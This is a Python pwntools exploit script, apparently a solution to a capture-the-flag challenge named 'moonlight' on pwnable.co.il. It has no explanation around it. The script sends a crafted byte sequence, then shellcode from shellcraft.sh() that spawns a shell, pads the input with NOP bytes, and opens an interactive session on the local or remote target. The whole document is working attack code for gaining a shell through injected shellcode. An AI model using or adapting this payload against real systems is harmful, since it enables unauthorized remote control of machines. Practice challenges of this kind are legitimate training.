#!/usr/bin/env python3 
from pwn import * 



context.binary = elf = ELF('./moonlight')
context.log_level = 'DEBUG'

if args['REMOTE']: 
    io = remote('pwnable.co.il', 9008)
else: 
    io = process([elf.path])
    #gdb.attach(io)



payload = [b'\x48', b'\x8b', b'\x85', b'\xc0', b'\xfb', b'\xff', b'\xff', b'\x8b', b'\x84', b'\x85', b'\xf0', b'\xfb', b'\xff', b'\xff', b'\x83', b'\xe0', b'\x01', b'\x85', b'\xc0', b't', b'\n', b'\xbf', b'\x01', b'\x00', b'\x00', b'\x00', b'\xe8', b' ', b'\xfe', b'\xff', b'\xff', b'H', b'\x83', b'\x85', b'\xe0', b'\xfb', b'\xff', b'\xff', b'\x01', b'H', b'\x81', b'\xbd', b'\xe0', b'\xfb', b'\xff', b'\xff', b'\xff', b'\x00', b'\x00', b'\x00', b'v', b'\xa5']
system_shellcode = asm(shellcraft.sh())

for shellcode in payload: 
    io.send(shellcode)
for shellcode in system_shellcode:
    io.send(chr(shellcode))
for _ in range(0x400 -  (len(payload) + len(system_shellcode))):
    io.send(b'\x90')    

io.interactive()

